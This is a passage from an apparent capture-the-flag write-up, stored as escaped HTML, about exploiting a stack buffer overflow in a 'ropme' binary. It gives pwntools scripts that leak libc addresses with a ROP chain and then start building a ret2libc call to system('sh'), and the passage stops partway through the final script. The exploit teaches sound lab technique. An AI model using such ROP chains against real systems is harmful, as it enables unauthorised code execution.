  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+10h] [bp-40h]&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ROP me outside, how 'about dah?&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;fflush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;fgets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1F4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;we notice that the length of the variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s&lt;/code&gt; is 0x40 but &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fgets&lt;/code&gt; reads 0x1F4 bytes from STDIN, which means we can overwrite the return address !.&lt;/p&gt;

&lt;h1 id=&quot;leaking-part&quot;&gt;Leaking part:&lt;/h1&gt;

&lt;p&gt;Our first goal is to leak 2 different libc function addresses, to do so, we will use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;puts&lt;/code&gt; function to print .got entries, I chose to leak &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;puts&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fgets&lt;/code&gt; addresses.&lt;/p&gt;

&lt;p&gt;Using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gdb&lt;/code&gt; we find that after 72 bytes we can overwrite the return address, time to build a small rop gadget to call puts and print .got entries, for this we need to find a gadget that puts data into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RDI&lt;/code&gt; something like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop RDI; ret&lt;/code&gt; would be cool, using &lt;a href=&quot;https://github.com/JonathanSalwan/ROPgadget&quot;&gt;ROPgadget&lt;/a&gt; on the binary we get :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/img/ropme_rop_gadget.png&quot; alt=&quot;ropme_rop_gadget&quot; /&gt;&lt;/p&gt;

&lt;p&gt;With all this information we can write a small script to extract &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;puts&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fgets&lt;/code&gt; addresses.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;binary&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'./ropme'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;pop_rdi_ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4006d3&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'127.0.0.1'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4444&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# connect to the remote service
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cyclic&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;72&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;          &lt;span class=&quot;c1&quot;&gt;# offset
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pop_rdi_ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;# pop rdi; ret
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;got&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;# argument
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;# function_call
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pop_rdi_ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;# pop rdi; ret
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;got&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fgets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;# argument
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;# function_call
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# return to main
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ROP me outside, how 'about dah?&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;puts_address&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ljust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fgets_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ljust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'puts() at %#x'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;puts_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'fgets() at %#x'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fgets_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;its output :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/img/ropme_leak_libc.png&quot; alt=&quot;ropme_leak_libc&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now having this juicy information we can search for the libc version using one of the many libc databases out there an example would be : &lt;a href=&quot;https://libc.blukat.me&quot;&gt;libc-database&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/img/ropme_libc_found.png&quot; alt=&quot;ropme_libc_found&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The remote target has &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc6_2.23&lt;/code&gt;, let’s just download it and use &lt;a href=&quot;https://docs.pwntools.com/en/stable&quot;&gt;pwntools&lt;/a&gt; to extract function’s offsets from it.&lt;/p&gt;

&lt;h1 id=&quot;exploit-part&quot;&gt;Exploit part:&lt;/h1&gt;

&lt;p&gt;Now that we can leak a libc function’s address we can calculate libc base address by : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc_base_address = leaked_function_address - function's_offset_in_libc&lt;/code&gt; and then get system address.&lt;/p&gt;

&lt;p&gt;The final exploit script :&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;binary&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'./ropme'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'./libc6_2.23-0ubuntu10_amd64.so'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;pop_rdi_ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4006d3&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;puts_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'puts'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;sys_offset&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'system'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;exit_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'exit'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;sh_offset&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'sh&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'127.0.0.1'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4444&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# connect to the remote service
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cyclic&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;72&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;          &lt;span class=&quot;c1&quot;&gt;# offset
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pop_rdi_ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;# pop rdi; ret
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;got&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;# argument
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;# function_call
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pop_rdi_ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;# pop rdi; ret
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;got&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fgets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;# argument
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;# function_call
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# return to main
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ROP me outside, how 'about dah?&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;puts_address&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ljust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fgets_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ljust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span 